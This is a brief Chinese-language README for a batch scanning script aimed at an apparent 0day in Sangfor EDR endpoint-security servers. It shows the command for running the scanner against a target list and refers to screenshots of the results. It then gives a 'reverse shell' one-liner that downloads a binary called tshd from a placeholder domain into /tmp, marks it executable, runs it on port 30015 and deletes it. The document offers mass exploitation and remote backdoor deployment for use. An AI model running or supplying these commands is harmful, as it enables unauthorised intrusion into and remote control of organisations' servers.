"# 深信服EDR 0day批量检测脚本" 
命令
python3 EDR-scan.py EDR.txt
效果图如下
![](./2.png)
访问URL
![](./1.png)
反弹shell命令如下
curl http://域名/tshd -o /tmp/tshd;chmod 777 /tmp/tshd;/tmp/tshd 30015; rm /tmp/tshd